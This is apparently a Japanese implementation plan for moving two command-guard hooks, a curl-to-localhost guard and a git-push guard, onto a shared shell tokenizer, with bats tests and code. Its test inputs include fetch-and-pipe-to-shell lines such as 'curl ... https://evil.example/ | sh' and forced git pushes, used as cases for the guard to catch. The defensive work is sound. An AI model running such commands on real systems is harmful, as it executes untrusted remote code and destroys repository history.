# Shell Command Reader Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

> **実装との差分(実装後の注記):** この plan は実装前の版のまま残してある。現在の正は ADR 0009 と `dot_claude/scripts/CLAUDE.md`。主な差分: (1) `shell_reader_fully_readable` は作らなかった(「読み切れた」の定義が hook ごとに違うため、curl-guard が flag を個別に読む)。(2) 8192 byte を超えるコマンドにも「何も返さない」のではなく、行単位の字面の床を当てて一致すれば `ask` にする。(3) レビューを受けて、reader に `SHELL_READER_BRACE_INDEXES` を足し、git-push-guard は番兵の byte・ブレース展開を `ask`、破壊的な長オプションの前方一致を `deny` にした。curl の字面の床は前置詞付きの curl も拾う。

**Goal:** PreToolUse の 2 つの guard hook が別々に持っているコマンド文字列の読み取りを 1 つの module(shell command reader)にまとめる。あわせて、2 つの hook の向きを「ask ルールに頼らず、`allow` を使わずに `deny` / `ask` / 無出力で判定する」にそろえる。

**Architecture:** `dot_claude/scripts/lib/shell-reader.bash` を source 専用の library として置く。quote を解釈する 1 文字走査で、token 列・segment 区切り・「読めなかった理由」の flag を返す。reader 自身は判定をしない。判定は各 hook の policy が持つ。

- Task 1: curl-guard を reader に載せ替える(振る舞いは変えない)
- Task 2: curl-guard の向きを反転する。`Bash(curl:*)` を ask から外し、hook が `ask` を返す
- Task 3: git-push-guard を reader に載せ替える(向きは今のまま)
- Task 4: 記述を実態に合わせる

**Tech Stack:** bash 3.2(macOS `/bin/bash`)+ jq、bats(`pnpm exec bats`)、chezmoi。

**Spec:**
- `docs/adr/0009-command-guard-hooks-gate-without-allow.md`(決定)
- `docs/adr/0008-command-guard-hooks-only-widen-an-approval-gate.md`(却下した案と、2.1.285 の実測)
- `dot_claude/scripts/CLAUDE.md`(両 hook の現行の契約と、その理由)

## Global Constraints

- bash 3.2 で動くこと。`mapfile` / 連想配列 / `${x^^}` / nameref を使わない。`set -u` 下で空配列を展開しない(要素数を先に見る)。
- library は shebang だけを持ち、`set` を書かない(`.claude/rules/shell-scripts.md`)。hook 本体は `#!/usr/bin/env bash` + `set -euo pipefail`。
- 日本語を含む文字列に埋める変数は、必ず `${VAR}` の形にする(`dot_claude/rules/common/shell-scripting.md`)。
- shfmt は `-i 4`。検証は `just shellcheck` / `just shfmt` / `just test-scripts` / `just lint` を呼ぶ(手で組まない)。
- bats では `$BATS_TEST_TMPDIR` を使い、`mktemp` を使わない。判定のテストは「出るべき」と「出ないべき」を対で書く。
- hook の `deny` / `ask` は `defaultMode: default` と `--permission-mode auto` の両方でブロックすることを実測済み(2026-09-30、ADR 0009)。
- **hook は `allow` を返さない。** Claude Code 2.1.285 では、ask ルールに一致する呼び出しに対して hook の `allow` が効かない(ADR 0008 の実測)。`deny` と `ask` は効く。
- reader の長さ上限は **8192 byte**。curl-guard の現行値も 8192 だが、文字数で数えていた。bats は `LC_ALL=C` で走り、本番のロケールも保証されないので、byte で数えて環境に依存しないようにする。上限を超えたコマンドには、両 hook とも何も返さない(ADR 0009)。
- 走査は関数内で `local LC_ALL=C` にして byte 単位で行う。
  - 実測: 8 KB の入力で、ja_JP.UTF-8 のままだと 0.58 秒、C にすると 0.13 秒以下。関数を抜けるとロケールは戻る。
  - UTF-8 の多バイト文字の byte は 0x80 以上なので、シェルの記号(すべて ASCII)と衝突しない。
  - chunk 分割による完全な線形化はしない(ユーザー確認済み)。

## Review Focus

1. **引用符の中の `;` `&` `|`**: `git commit -m "fix; git push --force"` を deny しない。このリファクタの出発点になった、実測済みの誤判定。Task 3 の回帰テストで固定する。
2. **ブレース展開の中の危険な綴り**: `git push origin {a,b} --force` は今と同じく deny。reader は `{` `}` で tokenize を止めず、flag を立てて単語を区切るだけにする。Task 1 の reader テストと Task 3 の hook テストで固定する。
3. **reader の読み込み失敗**: lib が無いときや壊れているときの扱い。
   - Task 1: curl-guard は無出力(ask ルールが残っているため)。
   - Task 2 以降: curl を含むコマンドには `ask` を返す。
   - git-push-guard: `ask` を返す。
   - どれも exit 1 にならないこと。lib の無いコピーを走らせるテストで固定する。
4. **引用符の中の置換に埋まった危険な push**: `echo "$(git push origin main --force)"` と、PR 本文の heredoc に書いた `git push --force` には `ask` を返す。どちらも今と同じ結果で、Task 3 の字面の床で固定する。
5. **curl を含まないコマンドで `ask` を出さない**: Task 2 で固定する。
   - `echo "curl is great"`(引用符の中は 1 token)
   - `gh pr create --body "…curl…"`
   - curl という語を含むだけの長いコマンド

---

## File Structure

| File | 役割 |
|---|---|
| Create `dot_claude/scripts/lib/shell-reader.bash` | shell command reader。token 列・segment の走査・flag を返し、判定はしない |
| Create `test/shell-reader.bats` | reader の interface のテスト。`shell_reader_read` 実行後の global と、`shell_reader_each_segment` を検査する |
| Modify `dot_claude/scripts/executable_curl-localhost-guard.sh` | Task 1 で reader に載せ替え、Task 2 で「`allow` / 無出力」を「無出力 / `ask`」に反転する |
| Modify `test/curl-localhost-guard.bats` | Task 1 で lib が無いときのテストを追加し、Task 2 で期待値を反転する |
| Modify `dot_claude/scripts/executable_git-push-guard.sh` | 正規化・`tr` による分割・`read -ra`・`unquote` を reader に置き換え、字面の床を足す |
| Modify `test/git-push-guard.bats` | 回帰のテストを追加する。既存テストの期待値は変えない |
| Modify `justfile` | `test-scripts` に `test/shell-reader.bats` を追加する |
| Modify `dot_claude/settings.json.tmpl` | `Bash(curl:*)` を ask から外し、curl-guard のコメントを書き直す |
| Modify `dot_claude/scripts/CLAUDE.md`, `harness/modules/project/35-key-patterns.md`(→ `just harness-sync`), `docs/solutions/workflow-issues/pretooluse-hook-allow-vs-permissions-ask.md`, spec の addendum | 「hook の allow が ask に勝つ」という古い記述を直し、向きをそろえたことを反映する |

`dot_claude/scripts/lib/` は `~/.claude/scripts/lib/` に配置される(`.chezmoiignore` の `scripts/` はリポジトリのルートにある `scripts/` だけに当たる)。Task 1 の最後に `chezmoi managed --source "$(pwd)"` で確かめる。hook は `"$(dirname "${BASH_SOURCE[0]}")/lib/shell-reader.bash"` を source するので、source tree(`dot_claude/scripts/`)と配置先(`~/.claude/scripts/`)のどちらでも同じ相対 path が成り立つ。

---

### Task 1: reader を切り出し、curl-guard をその上に載せ替える(振る舞いは変えない)

**Files:**
- Create: `dot_claude/scripts/lib/shell-reader.bash`
- Create: `test/shell-reader.bats`
- Modify: `dot_claude/scripts/executable_curl-localhost-guard.sh`(`SEP=` の宣言 59 行付近、`$`/バッククォート/SEP の `case` 87–89 行、長さ上限 78 行、`# --- tokenizer ---` から `tokenize()` の終わり 288 行まで、末尾の segment 走査 537–603 行)
- Modify: `test/curl-localhost-guard.bats`(末尾に 1 件追加)
- Modify: `justfile:116`

**Interfaces:**
- Produces(Task 2・3 が使う):
  - `shell_reader_read <command>` — 常に 0 を返す。以下の global を設定する:
    - `SHELL_READER_TOKENS` — token の配列。引用符は解釈済み(外してある)。segment の区切り(`;` `|` `&` 改行 `(` `)`)は `SHELL_READER_SEP` の 1 要素。redirect は fd の数字ごと 1 token(`2>&1`、`>`、`>>`、`>file`)
    - `SHELL_READER_SEP` — `$'\x01'`
    - `SHELL_READER_GLOB_INDEXES` — 引用符の外の `?` / `[` を含む token の index を空白区切りで持つ文字列(前後に空白。例 `' 3 7 '`、無ければ `' '`)
    - `SHELL_READER_TOO_LONG` — 8192 byte 超なら 1。そのとき token は空
    - `SHELL_READER_EXPANSION` — `$` かバッククォートがコマンドのどこか(引用符の中も含む)にあれば 1
    - `SHELL_READER_WORD_MULTIPLIER` — 引用符の外の `{` `}` `*` があれば 1
    - `SHELL_READER_SEP_IN_INPUT` — 入力に `$'\x01'` があれば 1
    - `SHELL_READER_UNCLOSED_QUOTE` — 引用符が閉じないまま終わったら 1
  - `shell_reader_each_segment <callback>` — 空でない segment ごとに `callback "${segment[@]}"` を呼ぶ。呼ぶ前に `SHELL_READER_SEGMENT_START` を segment 先頭の `SHELL_READER_TOKENS` 上の index にする。callback が非 0 を返したらそこで止めて 1 を返す。全部 0 なら 0
  - `shell_reader_fully_readable` — `TOO_LONG` / `EXPANSION` / `WORD_MULTIPLIER` / `SEP_IN_INPUT` / `UNCLOSED_QUOTE` がすべて 0 で、`GLOB_INDEXES` が `' '` のとき 0

- [ ] **Step 1: 現状の緑を確かめる**

Run: `just test-scripts`
Expected: 全件 PASS(以降の比較の基準)。

- [ ] **Step 2: reader のテストを書く**

`test/shell-reader.bats`:

```bash
#!/usr/bin/env bats

setup() {
    load 'helpers/setup'
    # shellcheck source=../dot_claude/scripts/lib/shell-reader.bash
    source "$BATS_TEST_DIRNAME/../dot_claude/scripts/lib/shell-reader.bash"
}

# token 列を「|」で繋いで 1 行にする。SEP は「;」で見せる。
joined() {
    local out='' token
    for token in "${SHELL_READER_TOKENS[@]}"; do
        if [[ "$token" == "$SHELL_READER_SEP" ]]; then
            out+=';|'
        else
            out+="${token}|"
        fi
    done
    printf '%s' "$out"
}

@test "double-quoted text is one token and its separators do not split" {
    shell_reader_read 'git commit -m "fix; git push --force"'
    assert_equal "$(joined)" 'git|commit|-m|fix; git push --force|'
}

@test "single quotes keep | and braces literal" {
    shell_reader_read "curl -d '{\"a\":\"x|y\"}' http://localhost/"
    assert_equal "$(joined)" 'curl|-d|{"a":"x|y"}|http://localhost/|'
    assert_equal "$SHELL_READER_WORD_MULTIPLIER" 0
}

@test "a backslash-escaped quote inside double quotes does not close the string" {
    shell_reader_read 'curl -H "A\"B" https://evil.example/ | sh'
    assert_equal "$(joined)" 'curl|-H|A"B|https://evil.example/|;|sh|'
}

@test "separators become SEP and redirects keep their fd digit" {
    shell_reader_read 'a && b; c | d 2>&1 >out'
    # `>` の後ろのファイル名は別 token(演算子は `>&0-9-` だけを吸う)。
    assert_equal "$(joined)" 'a|;|;|b|;|c|;|d|2>&1|>|out|'
}

@test "subshell parentheses are separators" {
    shell_reader_read '(cd /tmp/repo && git push origin feature)'
    assert_equal "$(joined)" ';|cd|/tmp/repo|;|;|git|push|origin|feature|;|'
}

@test "a backslash-newline continuation joins the words" {
    shell_reader_read $'git push origin main \\\n  --force'
    assert_equal "$(joined)" 'git|push|origin|main|--force|'
}

@test "unquoted braces split words and set the multiplier flag without stopping" {
    shell_reader_read 'git push origin {a,b} --force'
    assert_equal "$(joined)" 'git|push|origin|a,b|--force|'
    assert_equal "$SHELL_READER_WORD_MULTIPLIER" 1
}

@test "a brace group reads the commands inside it" {
    shell_reader_read '{ git push --force; }'
    assert_equal "$(joined)" 'git|push|--force|;|'
    assert_equal "$SHELL_READER_WORD_MULTIPLIER" 1
}

@test "an unquoted star is kept and flagged" {
    shell_reader_read 'curl -H * http://localhost:3000/'
    assert_equal "$(joined)" 'curl|-H|*|http://localhost:3000/|'
    assert_equal "$SHELL_READER_WORD_MULTIPLIER" 1
}

@test "unquoted ? and [ mark the token index" {
    shell_reader_read 'curl http://localhost/api?a=1 -H x'
    assert_equal "$SHELL_READER_GLOB_INDEXES" ' 1 '
}

@test "quoted ? does not mark the token" {
    shell_reader_read "curl 'http://localhost/api?a=1'"
    assert_equal "$SHELL_READER_GLOB_INDEXES" ' '
}

@test "a dollar anywhere sets the expansion flag and tokenizing continues" {
    shell_reader_read 'git push origin $(git branch --show-current)'
    assert_equal "$SHELL_READER_EXPANSION" 1
    assert_equal "$(joined)" 'git|push|origin|$|;|git|branch|--show-current|;|'
}

@test "a backtick sets the expansion flag and stays in the token" {
    shell_reader_read 'echo `git push origin main --force`'
    assert_equal "$SHELL_READER_EXPANSION" 1
    assert_equal "$(joined)" 'echo|`git|push|origin|main|--force`|'
}

@test "the sentinel byte in the input is flagged" {
    shell_reader_read $'curl http://localhost/ \x01 echo x'
    assert_equal "$SHELL_READER_SEP_IN_INPUT" 1
}

@test "an unclosed quote is flagged" {
    shell_reader_read $'cat <<EOF\ndon\'t\nEOF\ngit push --force'
    assert_equal "$SHELL_READER_UNCLOSED_QUOTE" 1
}

@test "an over-long command yields no tokens" {
    local long
    long=$(printf 'a%.0s' $(seq 1 8193))
    shell_reader_read "$long"
    assert_equal "$SHELL_READER_TOO_LONG" 1
    assert_equal "${#SHELL_READER_TOKENS[@]}" 0
}

@test "the length limit counts bytes whatever the caller's locale is" {
    local body
    # 2731 文字 = 8193 byte。文字数なら上限内、byte なら超過。
    body=$(printf 'あ%.0s' $(seq 1 2731))
    # ロケールが無い環境(CI)では C に落ちるが、byte で数えることの検査としては同じ。
    LC_ALL=ja_JP.UTF-8 shell_reader_read "$body" 2>/dev/null
    assert_equal "$SHELL_READER_TOO_LONG" 1
    body=$(printf 'あ%.0s' $(seq 1 2730))
    shell_reader_read "$body"
    assert_equal "$SHELL_READER_TOO_LONG" 0
    assert_equal "${SHELL_READER_TOKENS[0]}" "$body"
}

@test "multibyte text survives the byte-wise walk unchanged" {
    shell_reader_read 'echo "日本語 テキスト" 終わり'
    assert_equal "$(joined)" 'echo|日本語 テキスト|終わり|'
}

@test "fully_readable is true only when nothing is flagged" {
    shell_reader_read 'git push -u origin feature'
    run shell_reader_fully_readable
    assert_success
    shell_reader_read 'git push origin $B'
    run shell_reader_fully_readable
    assert_failure
}

@test "each_segment skips empty segments and reports the start index" {
    seen=''
    record() { seen+="${SHELL_READER_SEGMENT_START}:$*|"; }
    shell_reader_read 'a b && c'
    shell_reader_each_segment record
    assert_equal "$seen" '0:a b|4:c|'
}

@test "each_segment stops at the first failing callback" {
    calls=0
    first_fails() { calls=$((calls + 1)); return 1; }
    shell_reader_read 'a; b; c'
    run shell_reader_each_segment first_fails
    assert_failure
    shell_reader_each_segment first_fails || true
    assert_equal "$calls" 1
}
```

- [ ] **Step 3: テストが落ちることを確かめる**

Run: `LC_ALL=C pnpm exec bats test/shell-reader.bats`
Expected: FAIL(`shell-reader.bash` が無く `source` で失敗)。

- [ ] **Step 4: reader を書く**

`dot_claude/scripts/lib/shell-reader.bash`。本体は `executable_curl-localhost-guard.sh:141-288` の `tokenize()` を移したもので、変更点は (1) global 名に `SHELL_READER_` を付ける、(2) `{` `}` `*` で return せず flag を立てて続ける(`{` `}` は単語を区切って捨て、`*` は token に残す)、(3) 末尾で引用符が開いたままなら flag、(4) 走査を `local LC_ALL=C` で行う、の 4 点。`\"` の扱いと redirect の扱いのコメントは元のものを移す。

```bash
#!/usr/bin/env bash
# PreToolUse フックが Bash ツールのコマンド文字列を読むための共有 reader。
# source 専用。set は呼び出し側に従う(set -u 下で動く)。
#
# 判定はしない。読んだ結果(token 列と segment 区切り)と、読み切れなかった理由
# (flag)だけを返し、それをどう扱うかは各フックの policy が決める。flag が立っても
# token は最後まで作る — 緩める判定は flag を見て諦め、塞ぐ判定は token から続けられる
# ようにするため(ADR 0009)。
#
# Interface: shell_reader_read / shell_reader_each_segment / shell_reader_fully_readable。
# global の意味は各関数の直前のコメントを参照。

# segment 区切りの番兵。入力に同じ byte があると偽の境界を注入できるので、
# SHELL_READER_SEP_IN_INPUT で呼び出し側に知らせる。
SHELL_READER_SEP=$'\x01'
SHELL_READER_MAX_LENGTH=8192

# $1 を読んで次の global を設定する。常に 0 を返す。
#   SHELL_READER_TOKENS           token 配列(引用符は外してある)。区切りは SHELL_READER_SEP
#   SHELL_READER_GLOB_INDEXES     引用符の外の ? / [ を含む token の index(" 3 7 " 形式)
#   SHELL_READER_TOO_LONG         上限超過。token は空
#   SHELL_READER_EXPANSION        $ かバッククォートがある(引用符の中も含む)
#   SHELL_READER_WORD_MULTIPLIER  引用符の外の { } *(シェルの展開で単語数が変わる)
#   SHELL_READER_SEP_IN_INPUT     番兵の byte が入力にある
#   SHELL_READER_UNCLOSED_QUOTE   引用符が閉じないまま終わった
shell_reader_read() {
    # ${s:i:1} は多バイトのロケールでは先頭から数え直すので二乗で遅くなる。byte 単位に
    # すると 1 文字あたりの費用が下がる(8 KB で 0.58 秒 → 0.13 秒以下)。UTF-8 の多バイト
    # 文字の byte は 0x80 以上で、ここで見る記号(すべて ASCII)と衝突しない。上限も
    # byte で数えるので、呼び出し側のロケールに依存しない。
    local LC_ALL=C
    local s=$1
    local length=${#s}
    SHELL_READER_TOKENS=()
    SHELL_READER_GLOB_INDEXES=' '
    SHELL_READER_TOO_LONG=0
    SHELL_READER_EXPANSION=0
    SHELL_READER_WORD_MULTIPLIER=0
    SHELL_READER_SEP_IN_INPUT=0
    SHELL_READER_UNCLOSED_QUOTE=0

    if [[ $length -gt $SHELL_READER_MAX_LENGTH ]]; then
        SHELL_READER_TOO_LONG=1
        return 0
    fi
    case "$s" in *'$'* | *'`'*) SHELL_READER_EXPANSION=1 ;; esac
    case "$s" in *"$SHELL_READER_SEP"*) SHELL_READER_SEP_IN_INPUT=1 ;; esac

    local index character quote='' current='' started=0 current_glob=0 operator

    # (以下、executable_curl-localhost-guard.sh の flush() と for ループを移す。
    #  TOKENS → SHELL_READER_TOKENS、GLOB_TOKEN_INDEXES → SHELL_READER_GLOB_INDEXES、
    #  SEP → SHELL_READER_SEP に置換する。変える分岐は次の 3 つだけ。)
```

置換後の `flush` と、変更する 3 分岐のコード(それ以外の分岐 — 引用符の中、`'`/`"`、`\`、空白、`;|` 改行 `()`、`&`、`>`/`<`、既定 — は元のコードを名前の置換だけで移す):

```bash
    _shell_reader_flush() {
        if [[ $started -eq 1 ]]; then
            if [[ $current_glob -eq 1 ]]; then
                SHELL_READER_GLOB_INDEXES+="${#SHELL_READER_TOKENS[@]} "
            fi
            SHELL_READER_TOKENS+=("$current")
            current=''
            started=0
            current_glob=0
        fi
    }
```

(元の `flush` は `tokenize` の中で定義されていた。bash の関数定義は global なので、名前の衝突を避けるため `_shell_reader_flush` にする。変数は動的スコープで `shell_reader_read` の local を読む。ループ内の `flush` 呼び出しはすべて `_shell_reader_flush` にする。)

```bash
        '{' | '}')
            # ブレース展開(`{x,https://evil.example/}` は 2 語になる)とブレースグループ
            # (`{ git push --force; }`)のどちらでも、記号自体は単語ではない。単語を区切って
            # 捨て、flag を立てて走査を続ける。塞ぐ側の判定が `git push origin {a,b} --force`
            # の `--force` を読めるようにするため。
            _shell_reader_flush
            SHELL_READER_WORD_MULTIPLIER=1
            ;;
        '*')
            # cwd の全ファイルに展開されうる。token には残し、flag で知らせる。
            SHELL_READER_WORD_MULTIPLIER=1
            current+=$character
            started=1
            ;;
```

ループの後:

```bash
    done

    [[ -n "$quote" ]] && SHELL_READER_UNCLOSED_QUOTE=1
    _shell_reader_flush
    return 0
}
```

(`[[ -n "$quote" ]] && …` は偽のとき非 0 を返すが、`&&` リストの一部なので `set -e` でも止まらない。次の行があるので関数の戻り値にもならない。)

続けて segment 走査と総合判定:

```bash
# 空でない segment ごとに callback を呼ぶ。呼ぶ前に SHELL_READER_SEGMENT_START を
# segment 先頭の SHELL_READER_TOKENS 上の index にする(GLOB_INDEXES との照合用)。
# callback が非 0 を返したらそこで止めて 1 を返す。
shell_reader_each_segment() {
    local callback=$1 position=0 count=${#SHELL_READER_TOKENS[@]} start=0
    local -a segment
    segment=()
    while [[ $position -lt $count ]]; do
        if [[ "${SHELL_READER_TOKENS[$position]}" == "$SHELL_READER_SEP" ]]; then
            if [[ ${#segment[@]} -gt 0 ]]; then
                SHELL_READER_SEGMENT_START=$start
                "$callback" "${segment[@]}" || return 1
            fi
            segment=()
            start=$((position + 1))
        else
            segment+=("${SHELL_READER_TOKENS[$position]}")
        fi
        position=$((position + 1))
    done
    if [[ ${#segment[@]} -gt 0 ]]; then
        SHELL_READER_SEGMENT_START=$start
        "$callback" "${segment[@]}" || return 1
    fi
    return 0
}

# どの flag も立っておらず、glob の印も無いとき 0。緩める判定の前提条件。
shell_reader_fully_readable() {
    [[ $SHELL_READER_TOO_LONG -eq 0 &&
        $SHELL_READER_EXPANSION -eq 0 &&
        $SHELL_READER_WORD_MULTIPLIER -eq 0 &&
        $SHELL_READER_SEP_IN_INPUT -eq 0 &&
        $SHELL_READER_UNCLOSED_QUOTE -eq 0 &&
        "$SHELL_READER_GLOB_INDEXES" == ' ' ]]
}
```

- [ ] **Step 5: reader のテストを通す**

Run: `LC_ALL=C pnpm exec bats test/shell-reader.bats`
Expected: 全件 PASS。落ちたテストは、テストではなく reader を直す(期待値は bash がそのコマンドを読む読み方そのもの)。

- [ ] **Step 6: curl-guard を reader に載せ替える**

`executable_curl-localhost-guard.sh` から次を削る: `SEP=$'\x01'` とその直前のコメント、長さ上限の行とそのコメント、`$`/バッククォート/SEP の `case` とそのコメント、`# --- tokenizer ---` 節の全体(`TOKENS=()` / `GLOB_TOKEN_INDEXES` / `UNREADABLE` の宣言と `tokenize()`)、末尾の `SAW_CURL=0` 以降の segment 走査。削ったコメントのうち「なぜ落とすか」の説明(`$` で宛先が変わる、SEP の注入、長さと二乗の走査、`\"`)は、呼び出し側の flag 判定の直前に 1〜2 文で残し、詳細は `lib/shell-reader.bash` を指す。

curlrc の検査の直後(元の tokenizer があった位置)に:

```bash
# shellcheck source-path=SCRIPTDIR
# shellcheck source=lib/shell-reader.bash
source "$(dirname "${BASH_SOURCE[0]}")/lib/shell-reader.bash" 2>/dev/null || exit 0
```

`classify_segment` を callback の形に書き換える(`SEGMENT` global の代わりに `"$@"`、`SEGMENT_START` の代わりに `SHELL_READER_SEGMENT_START`、`GLOB_TOKEN_INDEXES` の代わりに `SHELL_READER_GLOB_INDEXES`):

```bash
SAW_CURL=0

# 1 segment を分類する。コマンド全体をプロンプトに残すべきときは非 0。
classify_segment() {
    local segment=("$@") binary=$1 index
    # (元のコメント「No prefix skipping …」「The bare name only …」をそのまま置く)
    if [[ "$binary" == "curl" ]]; then
        for ((index = 1; index < ${#segment[@]}; index++)); do
            case "$SHELL_READER_GLOB_INDEXES" in
            *" $((SHELL_READER_SEGMENT_START + index)) "*)
                glob_token_is_loopback_safe "${segment[$index]}" || return 1
                ;;
            esac
        done
        classify_curl "${segment[@]}" || return 1
        SAW_CURL=1
        return 0
    fi

    in_list "$binary" "$INERT_COMMANDS" || return 1
    return 0
}

shell_reader_read "$COMMAND"
# 変数・置換は宛先を運べる、番兵は偽の segment 境界を作れる、{ } * は単語数を変える、
# 長すぎる入力は安く読めない。どれも読み切れないコマンドとして ask に任せる。
# 引用符の閉じ忘れはここでは見ない(元の走査も見ておらず、閉じていない token は
# URL として読めずにプロンプトへ落ちる)。
if [[ $SHELL_READER_TOO_LONG -eq 1 || $SHELL_READER_EXPANSION -eq 1 ||
    $SHELL_READER_SEP_IN_INPUT -eq 1 || $SHELL_READER_WORD_MULTIPLIER -eq 1 ]]; then
    exit 0
fi
[[ ${#SHELL_READER_TOKENS[@]} -eq 0 ]] && exit 0

shell_reader_each_segment classify_segment || exit 0
[[ $SAW_CURL -eq 1 ]] || exit 0

emit_allow
exit 0
```

- [ ] **Step 7: lib が無いときのテストを curl 側に足す**

`test/curl-localhost-guard.bats` の末尾に:

```bash
@test "a missing reader library falls back to no output" {
    mkdir -p "$BATS_TEST_TMPDIR/bin"
    cp "$SCRIPT" "$BATS_TEST_TMPDIR/bin/guard.sh"
    run bash -c 'jq -n --arg c "$1" "{tool_name:\"Bash\",tool_input:{command:\$c}}" | bash "$2"' \
        _ 'curl http://localhost:3000/' "$BATS_TEST_TMPDIR/bin/guard.sh"
    assert_success
    assert_output ''
}
```

対になる「lib があれば allow」は既存の `bare localhost URL is allowed` が担う。

- [ ] **Step 8: justfile に reader のテストを足す**

`justfile:116`:

```
    LC_ALL=C pnpm exec bats test/notify.bats test/worktree-include.bats test/git-push-guard.bats test/curl-localhost-guard.bats test/secretlint-guard.bats test/shell-reader.bats
```

- [ ] **Step 9: 振る舞いが変わっていないことを確かめる**

Run: `just test-scripts && just shellcheck && just shfmt`
Expected: curl-localhost-guard の既存 92 件が**無修正で**全件 PASS。追加の 1 件も PASS。shellcheck / shfmt も通る。既存のテストが落ちたら、長さの上限を byte で数えるようにした変更(Global Constraints)以外に原因があるはずなので、テストではなく reader か curl の載せ替えを直す。上限の変更が原因のテストだけは、期待値を無出力に直してよい。

性能: 

Run: `body=$(printf 'word %.0s' $(seq 1 1600)); c="curl http://localhost/ -d \"${body:0:8000}\""; jq -n --arg c "$c" '{tool_input:{command:$c}}' > "$TMPDIR/p.json"; /usr/bin/time -p bash dot_claude/scripts/executable_curl-localhost-guard.sh < "$TMPDIR/p.json"`
Expected: `allow` が出て、`real` が 0.2 秒以下(変更前は 0.58 秒)。

配置: 

Run: `chezmoi managed --source "$(pwd)" | grep 'scripts/lib'`
Expected: `.claude/scripts/lib/shell-reader.bash`

- [ ] **Step 10: Commit**

```bash
git add dot_claude/scripts/lib/shell-reader.bash test/shell-reader.bats dot_claude/scripts/executable_curl-localhost-guard.sh test/curl-localhost-guard.bats justfile
git commit -m "refactor(claude): curl-localhost-guard の tokenizer を共有の shell command reader に切り出す"
```

---

### Task 2: curl-guard の向きを反転する(ask ルールを外し、hook が `ask` を返す)

**Files:**
- Modify: `dot_claude/scripts/executable_curl-localhost-guard.sh`(冒頭の契約コメント、`emit_allow`、stdin / jq / curlrc の bail-out、Task 1 で書いた末尾)
- Modify: `test/curl-localhost-guard.bats`
- Modify: `dot_claude/settings.json.tmpl`(ask 配列の `"Bash(curl:*)",`、ask のコメント、PreToolUse の curl-localhost-guard のコメント 434 行付近)

**Interfaces:**
- Consumes: Task 1 の reader(`shell_reader_read` / `shell_reader_each_segment` と `SHELL_READER_*`)、Task 1 後の `classify_segment` / `classify_curl` / `glob_token_is_loopback_safe` / `INERT_COMMANDS`(中身は変えない)
- Produces: hook の判定の契約
  - `ask`: コマンドに **curl を実行しうる token**(`${token#\`}` の basename が `curl`)があり、しかも次のどれかに当たるとき
    - 読み切れない(`EXPANSION` / `SEP_IN_INPUT` / `WORD_MULTIPLIER`)
    - curlrc がある
    - Task 1 の allow 条件(すべての segment がループバック宛の curl か `INERT_COMMANDS`)を満たさない
    - stdin を読めない / jq が無い / lib を読めない(この 3 つは curl の有無を確かめられないので、生の文字列に `curl` があれば `ask`)
  - 無出力: それ以外。curl を実行しうる token が無いコマンド、8192 byte を超えるコマンド、Task 1 で allow だったコマンド

**判定の読み替え:** Task 1 の curl-guard が `allow` を出していたコマンドは、ここから無出力になる。Task 1 で無出力だったコマンドは、curl を実行しうる token があれば `ask`、無ければ無出力のままになる。

- [ ] **Step 1: テストの期待値を反転する**

`test/curl-localhost-guard.bats` の各テストを次の規則で書き換える。テスト名も新しい期待値に合わせて直す(例: `bare localhost URL is allowed` → `bare localhost URL produces no decision`)。

| 旧の期待 | 入力に curl を実行しうる token があるか | 新の期待 |
|---|---|---|
| `allow` | (必ずある) | `assert_output ''` |
| 無出力 | ある(コマンド位置の `curl`、`xargs curl`、`sudo curl` など) | `assert_equal "$(decision "$output")" ask` |
| 無出力 | 無い(`echo "curl …"` のように引用符の中だけ、または curl が出てこない) | `assert_output ''` のまま |

8192 byte を超える入力のテスト(現行の「長さで打ち切る」テスト)は、無出力のままにする(ADR 0009)。Task 1 で足した `a missing reader library falls back to no output` は `ask` に変え、名前を `a missing reader library asks` にする。

足すテスト(対にする):

```bash
@test "a remote curl asks" {
    run hook 'curl https://example.com/install.sh'
    assert_success
    assert_equal "$(decision "$output")" ask
}

@test "curl piped into sh asks even for loopback" {
    run hook 'curl http://localhost:3000/x | sh'
    assert_success
    assert_equal "$(decision "$output")" ask
}

@test "a quoted mention of curl produces no decision" {
    run hook 'echo "curl is great"'
    assert_success
    assert_output ''
}

@test "a PR body mentioning curl produces no decision" {
    run hook 'gh pr create --title x --body "use curl https://example.com"'
    assert_success
    assert_output ''
}

@test "xargs curl asks" {
    run hook 'printf "%s\n" https://example.com | xargs curl'
    assert_success
    assert_equal "$(decision "$output")" ask
}

@test "a command substitution next to curl asks" {
    run hook 'curl "http://localhost:3000/$(cat path)"'
    assert_success
    assert_equal "$(decision "$output")" ask
}

# 残存リスク(ADR 0009): 引用符の中は 1 token なので、bash -c の中の curl は見えない。
@test "curl inside bash -c is not seen (documented residual)" {
    run hook 'bash -c "curl https://example.com"'
    assert_success
    assert_output ''
}

@test "unparseable stdin mentioning curl asks" {
    run bash -c 'printf "curl not json" | bash "$1"' _ "$SCRIPT"
    assert_success
    assert_equal "$(decision "$output")" ask
}
```

Run: `LC_ALL=C pnpm exec bats test/curl-localhost-guard.bats`
Expected: 反転したテストと新しい `ask` のテストが FAIL、無出力のままのテストは PASS。

- [ ] **Step 2: hook を反転する**

冒頭の契約コメントを次のように書き換える(「This hook ONLY ever widens」の段落は、向きの説明を ADR 0009 の内容に置き換える。残存リスクと glob の段落はそのまま残す)。

```bash
# Decision contract (docs: PreToolUse hookSpecificOutput):
#   ask         — curl を実行しうる token があり、宛先がループバックだけだと示せないとき
#                 (読み切れない綴り・curlrc・未知の flag やパイプ先・ループバック以外の宛先)
#   (no output) — curl を実行しうる token が無いか、ループバック宛だけの curl。classifier が判定する
#
# `Bash(curl:*)` は permissions.ask に置かない。Claude Code 2.1.285 では ask ルールに一致した呼び出しに
# フックの allow が効かず、緩める向きが作れないため(ADR 0008 / 0009)。代わりにこのフックが ask を返す。
# フックが死ぬと curl は classifier だけになる(git-push-guard と同じ向き)。
```

`emit_allow` を `emit_ask` に置き換える(jq を使わない固定文。理由の文言に変数を入れない):

```bash
emit_ask() {
    printf '%s\n' '{"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"ask","permissionDecisionReason":"curl-localhost-guard: 宛先がループバック(localhost / 127.0.0.0/8 / [::1])だけだと確認できないため、承認が必要です。"}}'
}
```

stdin・jq・COMMAND の取り出しの bail-out を、「生の入力に curl があれば ask」に変える:

```bash
STDIN_JSON=$(cat) || {
    emit_ask
    exit 0
}
if ! command -v jq >/dev/null 2>&1; then
    case "$STDIN_JSON" in *curl*) emit_ask ;; esac
    exit 0
fi
